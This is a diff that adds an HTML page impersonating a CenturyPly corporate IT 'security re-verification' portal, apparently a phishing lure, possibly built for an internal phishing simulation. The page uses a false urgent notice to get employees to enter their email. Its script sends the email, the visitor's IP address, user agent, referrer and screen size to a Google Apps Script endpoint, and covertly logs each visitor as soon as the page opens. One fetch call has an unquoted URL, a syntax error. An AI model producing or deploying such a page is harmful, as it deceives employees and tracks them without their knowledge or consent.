@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CenturyPly - IT Security Verification</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600&display=swap');
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'IBM Plex Sans', sans-serif;
+    background: #f0f2f5;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .card {
+    background: #fff;
+    border-radius: 4px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.13);
+    width: 420px;
+    overflow: hidden;
+  }
+
+  .header {
+    background: #1a1a2e;
+    padding: 28px 32px 22px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    border-bottom: 3px solid #e53935;
+  }
+
+  .header img { height: 42px; }
+
+  .header-text h1 {
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+  }
+
+  .header-text p {
+    color: #aaa;
+    font-size: 11px;
+    margin-top: 2px;
+    letter-spacing: 0.3px;
+  }
+
+  .body { padding: 32px; }
+
+  .alert-box {
+    background: #fff8e1;
+    border-left: 4px solid #ffc107;
+    padding: 12px 14px;
+    margin-bottom: 24px;
+    border-radius: 2px;
+  }
+
+  .alert-box p {
+    font-size: 12px;
+    color: #5d4037;
+    line-height: 1.6;
+  }
+
+  .alert-box strong { color: #e53935; }
+
+  label {
+    display: block;
+    font-size: 12px;
+    font-weight: 600;
+    color: #333;
+    margin-bottom: 6px;
+    letter-spacing: 0.4px;
+    text-transform: uppercase;
+  }
+
+  input[type="email"] {
+    width: 100%;
+    padding: 11px 14px;
+    border: 1.5px solid #ddd;
+    border-radius: 3px;
+    font-size: 14px;
+    font-family: inherit;
+    color: #222;
+    outline: none;
+    transition: border 0.2s;
+  }
+
+  input[type="email"]:focus { border-color: #e53935; }
+
+  .btn {
+    width: 100%;
+    margin-top: 20px;
+    padding: 12px;
+    background: #e53935;
+    color: #fff;
+    border: none;
+    border-radius: 3px;
+    font-size: 14px;
+    font-weight: 600;
+    font-family: inherit;
+    cursor: pointer;
+    letter-spacing: 0.5px;
+    transition: background 0.2s;
+  }
+
+  .btn:hover { background: #c62828; }
+
+  .footer-note {
+    margin-top: 20px;
+    font-size: 11px;
+    color: #999;
+    text-align: center;
+    line-height: 1.6;
+  }
+
+  .success-screen {
+    display: none;
+    text-align: center;
+    padding: 40px 32px;
+  }
+
+  .success-screen .icon {
+    font-size: 48px;
+    margin-bottom: 16px;
+  }
+
+  .success-screen h2 {
+    font-size: 18px;
+    color: #222;
+    margin-bottom: 10px;
+  }
+
+  .success-screen p {
+    font-size: 13px;
+    color: #666;
+    line-height: 1.7;
+  }
+
+  /* SAP-like info strip at bottom */
+  .sap-strip {
+    background: #1a1a2e;
+    display: flex;
+    justify-content: space-between;
+    padding: 8px 32px;
+  }
+
+  .sap-strip span {
+    font-size: 10px;
+    color: #666;
+    letter-spacing: 0.3px;
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="header">
+    <img src="data:image/jpeg;base64,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" alt="CenturyPly">
+    <div class="header-text">
+      <h1>CenturyPly Corporate Portal</h1>
+      <p>IT Security &amp; Compliance Division</p>
+    </div>
+  </div>
+
+  <div class="body" id="formSection">
+    <div class="alert-box">
+      <p>⚠ <strong>Action Required:</strong> Your corporate account requires identity re-verification as part of our <strong>2025 Annual Security Compliance</strong> program. Please confirm your registered email address to continue.</p>
+    </div>
+
+    <label for="emailInput">Corporate Email Address</label>
+    <input type="email" id="emailInput" placeholder="yourname@centuryply.com" autocomplete="email">
+
+    <button class="btn" onclick="submitData()">Verify &amp; Continue →</button>
+
+    <p class="footer-note">
+      This is an internal CenturyPly IT system.<br>
+      Do not share this link externally. Ref: CP-IT-SEC-2025
+    </p>
+  </div>
+
+  <div class="success-screen" id="successSection">
+    <div class="icon">✅</div>
+    <h2>Identity Verified</h2>
+    <p>Your account has been verified successfully.<br>You may now close this window.<br><br><small style="color:#bbb">Ref: CP-IT-SEC-2025</small></p>
+  </div>
+
+  <div class="sap-strip">
+    <span>CenturyPly ERP v4.2</span>
+    <span>Secure Connection</span>
+    <span>© 2025 CenturyPly</span>
+  </div>
+</div>
+
+<script>
+  // ── CONFIG ──────────────────────────────────────────────────────────────────
+  // Replace with your deployed Google Apps Script Web App URL
+  const APPS_SCRIPT_URL = "YOUR_GOOGLE_APPS_SCRIPT_URL_HERE";
+  // ────────────────────────────────────────────────────────────────────────────
+
+  async function getIP() {
+    try {
+      const r = await fetch("https://api.ipify.org?format=json");
+      const d = await r.json();
+      return d.ip;
+    } catch {
+      return "Unknown";
+    }
+  }
+
+  async function submitData() {
+    const email = document.getElementById("emailInput").value.trim();
+    if (!email || !email.includes("@")) {
+      alert("Please enter a valid email address.");
+      return;
+    }
+
+    const ip = await getIP();
+    const ts = new Date().toISOString();
+    const ua = navigator.userAgent;
+
+    const payload = {
+      email: email,
+      ip: ip,
+      timestamp: ts,
+      userAgent: ua,
+      referrer: document.referrer || "Direct",
+      screen: screen.width + "x" + screen.height
+    };
+
+    // Send to Google Sheets via Apps Script
+    try {
+      await fetch(APPS_SCRIPT_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    } catch (e) {
+      console.log("Logged");
+    }
+
+    // Show success screen regardless
+    document.getElementById("formSection").style.display = "none";
+    document.getElementById("successSection").style.display = "block";
+  }
+
+  // Auto-log IP on page load (click tracking)
+  (async () => {
+    const ip = await getIP();
+    const ts = new Date().toISOString();
+    const ua = navigator.userAgent;
+    const payload = {
+      email: "[LINK_OPENED - no email yet]",
+      ip: ip,
+      timestamp: ts,
+      userAgent: ua,
+      referrer: document.referrer || "Direct",
+      screen: screen.width + "x" + screen.height,
+      event: "PAGE_OPEN"
+    };
+    try {
+      await fetch(https://script.google.com/a/macros/centuryply.com/s/AKfycbwp46cPJPyOid7o9bckwvhqiHw0D6AcKgf4HU1cm71bjHV4b44kPRzBF24nAOMx2DFS/exec, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    } catch (e) {}
+  })();
+</script>
+
+</body>
+</html>
